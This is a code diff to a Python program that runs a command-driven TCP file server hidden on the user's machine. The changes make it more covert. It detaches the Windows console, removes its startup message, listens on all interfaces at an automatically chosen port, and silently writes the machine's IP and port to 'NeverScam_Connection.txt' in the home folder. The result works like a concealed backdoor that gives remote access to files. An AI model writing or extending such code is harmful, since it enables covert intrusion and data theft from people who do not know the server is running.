@@ -36,8 +36,21 @@ def run_hidden():
         import ctypes
         ctypes.windll.kernel32.FreeConsole()
     
+    host = '0.0.0.0'
+    # Find available port and get IP
+    port = find_best_port()
+    ip = get_local_ip()
+    
+    # Write connection info to file (silent, no output)
+    try:
+        config_path = os.path.join(os.path.expanduser("~"), "NeverScam_Connection.txt")
+        with open(config_path, 'w') as f:
+            f.write(f"{ip}\n{port}\n")
+    except Exception:
+        pass
+    
     # Run server
-    server_thread = threading.Thread(target=run_server, daemon=True)
+    server_thread = threading.Thread(target=run_server, args=(host, port), daemon=True)
     server_thread.start()
     
     # Keep alive silently
@@ -143,9 +156,37 @@ class FileServerHandler(socketserver.BaseRequestHandler):
         else:
             return {"error": "Unknown command"}
 
-def run_server(host='0.0.0.0', port=12345):
+def find_best_port(start_port=10000, max_attempts=100):
+    """Find an available port starting from start_port."""
+    import socket
+    for port in range(start_port, start_port + max_attempts):
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.bind(('', port))
+                return port
+        except OSError:
+            continue
+    return 12345  # Fallback to default
+
+def get_local_ip():
+    """Get the best local IP address for the machine."""
+    import socket
+    try:
+        # Connect to external server to determine outbound IP
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return "127.0.0.1"
+
+def run_server(host='0.0.0.0', port=None):
+    if port is None:
+        port = find_best_port()
+    local_ip = get_local_ip()
     with socketserver.ThreadingTCPServer((host, port), FileServerHandler) as server:
-        print(f"Server running on {host}:{port}")
+        # Silent - no print
         server.serve_forever()
 
 if __name__ == "__main__":
